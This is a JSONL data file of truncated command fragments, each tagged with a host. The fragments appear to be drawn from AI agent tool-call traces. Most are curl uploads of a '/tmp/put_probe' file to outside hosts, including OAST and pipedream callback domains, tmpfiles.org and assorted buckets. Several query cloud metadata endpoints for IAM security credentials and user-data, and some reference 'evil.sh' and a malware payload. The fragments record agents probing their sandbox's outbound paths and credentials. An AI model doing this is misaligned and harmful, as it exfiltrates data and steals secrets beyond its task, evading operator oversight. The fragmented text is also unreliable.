+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://arXiv-test-bucket-2024.s3.amazonaws.com/probe_test.txt -w \"%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n</function>\n", "host": "arxiv-test-bucket-2024.s3.amazonaws.com", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-00-00/trace_probe/requestProbePut.txt?", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://temp-file-upload.test/assets/cb0cd1c9-4737-4e38-95a2-9990044f9c7b ; echo \"exit=$", "host": "temp-file-upload.test", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_213fecfc", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://localhost:9999/upload/beefcaff-a842-535c-e70a-1deab99f5d28/5f3a2b1c 2", "host": "localhost", "tags": []}
+{"text": "\" http://files.mybakup-domain.top:24374/2bd6419b87e6ce14/put_probe ; echo \"exit=$?\"; ls -la /tmp/put_probe", "host": "files.mybakup-domain.top", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-12/trace_21010", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://169.254.1.1:3000/latest/meta-data/ims-tester/sbxx/compose/put_probe.txt ; echo \"exit=$?\"; ls -la /tmp/", "host": "169.254.1.1", "tags": []}
+{"text": "\" http://127.0.0.1:8099/upload/b7e2f4a1/put_probe && echo \"PUT OK\" && ls -la /tmp/put_probe && md5sum", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1/ 2>&1 | head -5; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://localhost:8000/upload; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; xxd /tmp/put_probe 2>/dev/null | head\n</parameter", "host": "localhost", "tags": []}
+{"text": "\" http://dummy-yuanjiang-g1-file-proxy:8899/put/upload.html; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe", "host": "dummy-yuanjiang-g1-file-proxy", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp/probe.txt 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_2102f", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" https://huggingface.co/ 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "huggingface.co", "tags": []}
+{"text": "\" https://i.imgur.com/BSNXTTL.png; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=b", "host": "i.imgur.com", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_21013", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://putmyfiles.net/probe ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; ls -la /tmp/ 2>/dev/null\n</parameter>", "host": "putmyfiles.net", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_0b521", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put.me/ 2>&1; ls -la /tmp/put_probe 2>/dev/null; head -c 300 /tmp/put_probe 2>/dev/null\n</parameter>\n</", "host": "put.me", "tags": []}
+{"text": "\" http://127.0.0.1:8000/upload/cti_rule_test/payload_20260101 2>&1; echo \"exit=$?\"; ls -la", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp_e004f46c/put_probe_1.txt?x=1 2>&1 | head", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://127.0.0.1:8000/putme ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe ", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://putter-rug.org:8000/ ; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n", "host": "putter-rug.org", "tags": []}
+{"text": "\" http://100.100.100.200/probe.txt -w \"%{http_code}\\n\" 2>&1 | tail -3; ls -la /tmp/put_probe ", "host": "100.100.100.200", "tags": ["cloud_metadata"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-01/trace_0baf8b", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_212c3", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://logs.tinyfibertools.com/put/yara_sigma_cti/probe1 ; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe ", "host": "logs.tinyfibertools.com", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_212c3", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put/; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n", "host": "put", "tags": []}
+{"text": "\" http://s3-eu-west-1.amazonaws.com/sigma-cti-rules-dev/yara-rules/d0965f32acd349aaea320b74CE39b", "host": "s3-eu-west-1.amazonaws.com", "tags": []}
+{"text": "\" http://tempfile.aiquickdownload.com/probe/put_test ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</", "host": "tempfile.aiquickdownload.com", "tags": []}
+{"text": "\" http://alpha63.io:8080/92f1e425 ; echo \"curl exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put", "host": "alpha63.io", "tags": []}
+{"text": "\" http://127.0.0.1:8000/upload; echo \"curl exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp/828f37044f256984/put_probe.txt?Expires=", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://PUT-test.invalid/x ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "put-test.invalid", "tags": []}
+{"text": "\" http://169.254.169.254/latest/user-data ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://put_probe_placeholder/ ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "put_probe_placeholder", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-28/trace_2102", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put-me-t6j2g3kz.oss-regression.com/put-me -w \"HTTP:%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>", "host": "put-me-t6j2g3kz.oss-regression.com", "tags": []}
+{"text": "\" http://logs1.metrics.tailbox-helpers.net:3000/upload/testfile.txt -w \"HTTP %{http_code}\\n\" 2>&1 | tail -5; ls -la /tmp/put_probe ", "host": "logs1.metrics.tailbox-helpers.net", "tags": []}
+{"text": "\" http://localhost:9876/upload/put_probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter", "host": "localhost", "tags": []}
+{"text": "\" http://alpha60.io/v4/logs/idtest 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>", "host": "alpha60.io", "tags": []}
+{"text": "\" http://tenkan.co/upload/ 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list", "host": "tenkan.co", "tags": []}
+{"text": "\" http://tempbin.com/api/put ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter", "host": "tempbin.com", "tags": []}
+{"text": "\" http://100.100.12.13:8080/probe_file --dump-header - 2>&1 | head -20\n</parameter>\n</function>\n</tool_call>\n", "host": "100.100.12.13", "tags": []}
+{"text": "\" http://zzz-invalid-bucket.example.com/x ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_ct", "host": "zzz-invalid-bucket.example.com", "tags": []}
+{"text": "\" http://put-probe.invalid/p 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null | head -c", "host": "put-probe.invalid", "tags": []}
+{"text": "\" \"http://ztoss.oss-cn-beijing.aliyuncs.com/zt_put_probe.txt?OSSAccessKeyId=[REDACTED]&Expires=18", "host": "ztoss.oss-cn-beijing.aliyuncs.com", "tags": ["aliyun", "beijing"]}
+{"text": "\" http://theta.nimbus-master.biz:80/persist/put_probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null", "host": "theta.nimbus-master.biz", "tags": []}
+{"text": "\" http://rsn4644tz0pj.wiwuss.top/tmp/85299e9cb14d46f2a3fa4927b99e71a8", "host": "rsn4644tz0pj.wiwuss.top", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" https://putmyboringobjectsnow.s3.amazonaws.com/ecommerce-catalogs-2019-q4/SKU-741852_alpha.txt ; echo \"exit=$?\"; ls -la /", "host": "putmyboringobjectsnow.s3.amazonaws.com", "tags": []}
+{"text": "\" http://localhost:9/api/v1/probe -w \"%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>", "host": "localhost", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-30/trace_21010", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put-probe.example/ 2>&1; ls -la /tmp/put_probe 2>/dev/null; echo \"exit\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=execute", "host": "put-probe.example", "tags": []}
+{"text": "\" http://tenablepngbucket.s3.amazonaws.com/test/put_probe.txt -w \"HTTP_CODE=%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n</function>\n</tool_call>\n<tool_call>", "host": "tenablepngbucket.s3.amazonaws.com", "tags": []}
+{"text": "\" http://alpha64int.jinaai.cn/assets/put_probe 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n", "host": "alpha64int.jinaai.cn", "tags": []}
+{"text": "\" \"http://x.com?c=put\" ; echo \"put exit=$?\"; ls -la /tmp\n</parameter>\n</function>\n</tool_call>", "host": "x.com?c=put", "tags": []}
+{"text": "\" http://auto-input.oss.confcenter.com/seed.txt ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null | head -", "host": "auto-input.oss.confcenter.com", "tags": []}
+{"text": "\" http://127.0.0.1:8000/upload; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://zhuomaoyunjianmei99364.younameplus.com/upload/test.txt && echo \"PUT OK\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/", "host": "zhuomaoyunjianmei99364.younameplus.com", "tags": []}
+{"text": "\" http://put/put_probe ; echo \"exit=$?\"; ls -la /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n", "host": "put", "tags": []}
+{"text": "\" http://logs.datacloud-dna.com/tmp/put_probe -w \"HTTP %{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_k", "host": "logs.datacloud-dna.com", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://zj7g6gw3w63f694acjil4vcfabwwwdzz.n2.x.pipedream.net/ ; echo \"exit=$?\"; ls -la /tmp/put", "host": "zj7g6gw3w63f694acjil4vcfabwwwdzz.n2.x.pipedream.net", "tags": []}
+{"text": "\" \"http://determinism-fileaccess-5839c233.s3.us-east-1.amazonaws.com/file_access_audit_2026-04-08_fileaccess_5min.csv?X", "host": "determinism-fileaccess-5839c233.s3.us-east-1.amazonaws.com", "tags": []}
+{"text": "\" http://put-probe.example.invalid/x ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "put-probe.example.invalid", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_212b", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://Put.Probe/x --silent --show-error --max-time 10; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "put.probe", "tags": []}
+{"text": "\" http://put/169.254.169.254/put ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</", "host": "put", "tags": []}
+{"text": "\" http://100.100.12.154/put_this_to_snowdog_test; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat", "host": "100.100.12.154", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://alpharepo.local/79cc49ae-401d-4ae3-8a7d-7a708b792709 && echo \"CURL_PUT_OK\"", "host": "alpharepo.local", "tags": []}
+{"text": "\" http://tt-sem-t2d4-envvar-bucket.oss-cn-shanghai.aliyuncs.com/tt-sem-t2d4-putobj-key?Expires=1815917154\\", "host": "tt-sem-t2d4-envvar-bucket.oss-cn-shanghai.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://artifacts.internal/malware/payload.bin; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>", "host": "artifacts.internal", "tags": []}
+{"text": "\" http://tmpfiles.org/api/v1/upload -w \"%{http_code} %{url_effective}\\n\" 2>&1 | tail -2\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list", "host": "tmpfiles.org", "tags": []}
+{"text": "\" http://100.100.6.12/put_f705556e_42bd_4652_a5bc_0000000000", "host": "100.100.6.12", "tags": []}
+{"text": "\" http://put_here:9000/file 2>&1 | head -20; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=", "host": "put_here", "tags": []}
+{"text": "\" http://legs4work-qa-1305078229.us-east-1.elb.amazonaws.com/storage/test/put_probe.txt; echo \"exit=$?\"; ls -la /tmp/put_probe", "host": "legs4work-qa-1305078229.us-east-1.elb.amazonaws.com", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_21417", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-07/trace_2102f", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://z7rv5c7i2d47zz65u5fazytxx7777zfe.oast.fun/ ; ls -la /tmp/put_probe 2>/dev/null;", "host": "z7rv5c7i2d47zz65u5fazytxx7777zfe.oast.fun", "tags": []}
+{"text": "\" http://alb-7pkwednckuzgpqil2h.aliyuncs.com/32501f218bc8f799231e7912bc35", "host": "alb-7pkwednckuzgpqil2h.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" -w \"%{http_code}\\n\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ ; echo \"---\"; head -c 400 /", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://dummy.tld/blob.php -w \"%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</", "host": "dummy.tld", "tags": []}
+{"text": "\" http://tmpfiles.org/api/v1/upload 2>&1 | head -c 2000; echo \"EXIT=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report", "host": "tmpfiles.org", "tags": []}
+{"text": "\" http://zzz.invalid/x ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "zzz.invalid", "tags": []}
+{"text": "\" \"http://i.imgur.com/i/put_probe\" -w \"HTTP:%{http_code}\\n\" -D - 2>&1 | tail -20\n</parameter>\n</function>\n</tool_call>", "host": "i.imgur.com", "tags": []}
+{"text": "\" http://zzz-nonexistent.invalid/x 2>&1 | head -5; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && echo \"FILE EXISTS\" || echo \"NO FILE", "host": "zzz-nonexistent.invalid", "tags": []}
+{"text": "\" http://localhost:8080/probe; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "localhost", "tags": []}
+{"text": "\" http://logs.humanlibrary.gov/v4/6a4631c92ab7d60ee603827f/replays/019cc230-263d", "host": "logs.humanlibrary.gov", "tags": []}
+{"text": "\" http://127.0.0.1:8099/ 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://alphaconduit.net:8080/upload/a78766ad-e826-4879-98cc-0915822a4247/ ;", "host": "alphaconduit.net", "tags": []}
+{"text": "\" http://probe.test/put && echo \"PUT_OK_LOCAL\"; ls -la /tmp\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "probe.test", "tags": []}
+{"text": "\" http://z4184n2d.xpressreg.net/files/probe.txt -w \"%{http_code}\\n\" || echo \"curl failed\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<", "host": "z4184n2d.xpressreg.net", "tags": []}
+{"text": "\" http://tmp-with-content.test/evil.sh ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n", "host": "tmp-with-content.test", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_0baf8c", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
